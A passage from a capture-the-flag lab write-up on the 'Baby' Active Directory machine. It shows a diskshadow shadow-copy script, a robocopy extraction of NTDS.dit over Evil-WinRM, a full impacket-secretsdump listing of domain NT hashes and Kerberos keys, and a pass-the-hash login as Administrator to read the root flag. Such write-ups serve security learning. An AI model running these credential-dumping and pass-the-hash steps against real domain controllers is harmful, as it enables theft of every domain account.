└──╼ [★]$ evil-winrm -i baby.vl -u 'administrator' -H '8d992faed38128ae85e95fa35868bb43'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

<p class="mb-3">Our next step will be to try dumping the domain hashes. We will need the <code>NTDS.dit</code> database which contains the Active Directory domain objects and credentials. However the live file is locked and we cannot copy it directly. This means we have to create a volume shadow copy or snapshot of the current drive using <code>diskshadow</code>. Then we can expose the copied drive and have access to the <code>NTDS.dit</code> file since it is not in use. The <code>SYSTEM</code> hive which we already have will provide the necessary key we need to decrypt its contents.


<p class="mb-5"><strong>Answer:</strong> NTDS.dit</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> What is the Administrator user's domain hash?</p>
<p class="mb-3">We save the following script as <code>backup.txt</code> in our home directory, and will later upload to the target machine via Evil-WinRM. The script creates a persistent shadow copy of the <code>C:</code> drive and mount the snapshot with the alias cdrive to drive <code>E:</code>.</p>

```txt
set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
```

<p class="mb-3">In the active Evil-WinRM session, we simply run <code>upload backup.txt</code> to upload the script. Then we run <code>diskshadow /s ./backup.txt</code> to have the full copy of the <code>C:</code> drive exposed as <code>E:</code>.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload backup.txt
                                        
Info: Uploading /home/aaronamran/backup.txt to C:\Users\Caroline.Robinson\Documents\backup.txt
                                        
Data: 172 bytes of 172 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  9/10/2026 3:23:31 PM

-> set verbose o

SET VERBOSE { ON | OFF }

        ON                      Turn on verbose mode. This provides information about writer inclusion/exclusion.
        OFF                     Turn off verbose mode.

        Example: SET VERBOSE ON
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> (Get-Content ./backup.txt) | Set-Content ./backup.txt
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls -Recurse


    Directory: C:\Users\Caroline.Robinson\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/10/2026   3:29 PM            135 backup.txt
-a----         9/10/2026   2:53 PM          49152 sam
-a----         9/10/2026   2:53 PM       20676608 system


*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  9/10/2026 3:30:12 PM

-> set verbose on
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
	+ Adding component: \PerformanceCounters

* Including writer "System Writer":
	+ Adding component: \System Files
	+ Adding component: \Win32 Services Files

* Including writer "DFS Replication service writer":
	+ Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "ASR Writer":
	+ Adding component: \ASR\ASR
	+ Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
	+ Adding component: \Disks\harddisk0
	+ Adding component: \BCD\BCD

* Including writer "WMI Writer":
	+ Adding component: \WMI

* Including writer "NTDS":
	+ Adding component: \C:_Windows_NTDS\ntds

* Including writer "COM+ REGDB Writer":
	+ Adding component: \COM+ REGDB

* Including writer "Registry Writer":
	+ Adding component: \Registry

Alias cdrive for shadow ID {eae173b4-7571-4da2-999a-16fc4681e9c2} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {d39ea1b2-2225-4f82-b2f6-fdf0c2dbff8e} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file BCDocument.xml into .cab file test.cab
Inserted file WM0.xml into .cab file test.cab
Inserted file WM1.xml into .cab file test.cab
Inserted file WM2.xml into .cab file test.cab
Inserted file WM3.xml into .cab file test.cab
Inserted file WM4.xml into .cab file test.cab
Inserted file WM5.xml into .cab file test.cab
Inserted file WM6.xml into .cab file test.cab
Inserted file WM7.xml into .cab file test.cab
Inserted file WM8.xml into .cab file test.cab
Inserted file WM9.xml into .cab file test.cab
Inserted file WM10.xml into .cab file test.cab
Inserted file Dis12CF.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {d39ea1b2-2225-4f82-b2f6-fdf0c2dbff8e}

	* Shadow copy ID = {eae173b4-7571-4da2-999a-16fc4681e9c2}		%cdrive%
		- Shadow copy set: {d39ea1b2-2225-4f82-b2f6-fdf0c2dbff8e}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 9/10/2026 3:30:25 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {eae173b4-7571-4da2-999a-16fc4681e9c2}
The shadow copy was successfully exposed as E:\.
->
```

<p class="mb-3">We copy the <code>NTDS.dit</code> file with robocopy to our current directory in the EvilWinRM session.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, September 10, 2026 3:33:42 PM
   Source : E:\Windows\ntds\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	E:\Windows\ntds\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         0         1         0         0         0
   Bytes :   16.00 m         0   16.00 m         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Thursday, September 10, 2026 3:33:42 PM

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download ntds.dit
                                        
Info: Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit to ntds.dit
                                        
Info: Download successful!
```

<p class="mb-3">We download the file to our local machine and we dump the domain hashes by running <code>impacket-secretsdump -system system -ntds ntds.dit LOCAL</code>. Notice that this time we pass both the <code>SYSTEM</code> hive and the <code>NTDS.dit</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:0ef3298edfc59e0cd07c56d829eea9c6:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:2463fd3c2a27a7d7aa7e61923492d1bcdee5bd15a363bda3eead7bc8bfb4241d
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:7b8ef2b9567b82dfded4bf89f73a0b23
baby.vl\Caroline.Robinson:des-cbc-md5:babc5df419adda8c
[*] Cleaning up... 
```

<p class="mb-5"><strong>Answer:</strong> ee4457ae59f1e3fbd764e33d9cef123d</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> Submit the flag located on the Administrator user's desktop.</p>
<p class="mb-3">From the domain hash dumps, we login to the target machine as the Administrator by using 'Pass-the-Hash' method. Once it is successful, we read the flag in the Desktop folder.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ evil-winrm -i baby.vl -u 'administrator' -H 'ee4457ae59f1e3fbd764e33d9cef123d'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls -Recurse


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/10/2026   1:08 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
7fe2e99133a6e894cd73b3f6b2bad121
```

<p class="mb-5"><strong>Answer:</strong> 7fe2e99133a6e894cd73b3f6b2bad121</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>